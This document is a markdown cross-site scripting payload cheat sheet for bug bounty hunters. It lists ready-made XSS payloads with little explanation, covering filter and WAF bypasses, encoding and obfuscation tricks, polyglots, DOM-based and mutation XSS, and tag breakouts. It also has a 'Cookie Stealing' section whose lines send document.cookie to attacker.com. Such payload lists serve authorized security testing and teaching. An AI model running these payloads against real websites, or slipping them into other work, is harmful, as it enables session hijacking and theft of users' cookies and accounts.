# XSS Payload Cheat Sheet

## Quick Reference for Bug Bounty Hunters

### Basic Payloads
```html
<script>alert('XSS')</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<iframe src=javascript:alert('XSS')>
```

### Event Handlers
```html
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<div onmouseover=alert(1)>Hover</div>
<details ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
```

### Filter Bypass - Case Variation
```html
<ScRiPt>alert(1)</sCrIpT>
<sCrIpT>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>
```

### Filter Bypass - Encoding
```html
<!-- URL Encoding -->
%3Cscript%3Ealert(1)%3C/script%3E

<!-- Double URL Encoding -->
%253Cscript%253Ealert(1)%253C/script%253E

<!-- HTML Entities -->
&lt;script&gt;alert(1)&lt;/script&gt;

<!-- Unicode -->
\u003cscript\u003ealert(1)\u003c/script\u003e

<!-- Hex -->
\x3cscript\x3ealert(1)\x3c/script\x3e
```

### Filter Bypass - No Quotes
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src=javascript:alert(1)>
```

### Filter Bypass - No Parentheses
```html
<svg onload=alert`1`>
<img src=x onerror=alert`1`>
```

### Filter Bypass - No Spaces
```html
<svg/onload=alert(1)>
<img/src=x/onerror=alert(1)>
<iframe/src=javascript:alert(1)>
```

### WAF Bypass
```html
<svg/onload=alert`1`>
<img src=x onerror=\u0061lert(1)>
<iframe src=\\\"javascript:alert`1`\\\">
<svg><animate onbegin=alert(1)>
<input onfocus=eval(atob('YWxlcnQoMSk=')) autofocus>
```

### Context-Specific

#### Inside HTML Attribute
```html
" autofocus onfocus=alert(1) x="
' autofocus onfocus=alert(1) x='
" onload=alert(1) x="
```

#### Inside JavaScript String
```javascript
'; alert(1); //
'; alert(1); var x='
'-alert(1)-'
";alert(1);//
```

#### Inside Event Handler
```javascript
alert(1)
alert(document.cookie)
alert(document.domain)
```

#### Inside URL
```
javascript:alert(1)
javascript:alert(document.cookie)
data:text/html,<script>alert(1)</script>
```

### Polyglot Payloads
```html
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>

'\"><img src=x onerror=alert(1)>

jaVasCript:/*-/*`/*\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//\x3e
```

### Cookie Stealing
```html
<script>fetch('https://attacker.com?c='+document.cookie)</script>
<img src=x onerror=this.src='https://attacker.com?c='+document.cookie>
<script>new Image().src='https://attacker.com?c='+document.cookie</script>
<svg/onload=fetch('https://attacker.com?c='+document.cookie)>
```

### DOM-Based XSS
```html
#<img src=x onerror=alert(1)>
#<script>alert(1)</script>
<script>eval(location.hash.slice(1))</script>
<script>document.write(location.hash.slice(1))</script>
```

### Mutation XSS (mXSS)
```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
<svg><style><img src=x onerror=alert(1)></style>
```

### Breaking Out of Tags
```html
<!-- Breaking out of script tag -->
</script><script>alert(1)</script>

<!-- Breaking out of style tag -->
</style><script>alert(1)</script>

<!-- Breaking out of textarea -->
</textarea><script>alert(1)</script>

<!-- Breaking out of title -->
</title><script>alert(1)</script>
```

### Alternative Tags
```html
<embed src=javascript:alert(1)>
<object data=javascript:alert(1)>
<form action=javascript:alert(1)><input type=submit>
<isindex action=javascript:alert(1) type=submit>
<math><mi//xlink:href="data:x,<script>alert(1)</script>">
```

### Using Different Events
```html
<body onload=alert(1)>
<body onpageshow=alert(1)>
<body onfocus=alert(1)>
<body onhashchange=alert(1)>
<frameset onload=alert(1)>
<svg onload=alert(1)>
<marquee onstart=alert(1)>
<details ontoggle=alert(1)>
```

### Encoded Payloads
```html
<!-- Base64 -->
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">

<!-- Data URI -->
<iframe src="data:text/html,<script>alert(1)</script>">

<!-- JavaScript URI -->
<iframe src="javascript:alert(1)">
```

### Obfuscation Techniques
```javascript
// String.fromCharCode
<script>alert(String.fromCharCode(88,83,83))</script>

// eval + atob (Base64)
<script>eval(atob('YWxlcnQoMSk='))</script>

// Unicode escape
<script>\u0061\u006c\u0065\u0072\u0074(1)</script>

// Hex escape
<script>\x61\x6c\x65\x72\x74(1)</script>
```

### Testing Checklist
- [ ] Basic script tags
- [ ] Image tags with onerror
- [ ] SVG with onload
- [ ] Event handlers
- [ ] JavaScript protocol
- [ ] Data URIs
- [ ] Breaking out of context
- [ ] Encoded payloads
- [ ] Polyglot payloads
- [ ] WAF bypass techniques

### Pro Tips
1. Always start with simple payloads
2. Analyze the context where input appears
3. Try different encoding methods
4. Use browser developer tools
5. Check for CSP headers
6. Test all input points
7. Verify execution manually
8. Document everything

---

**Remember:** Only test on authorized targets!

**Created by:** Aditya Sharma  
**Repository:** [XSS-BugBounty-Android-App](https://github.com/Hackhubadi/XSS-BugBounty-Android-App)
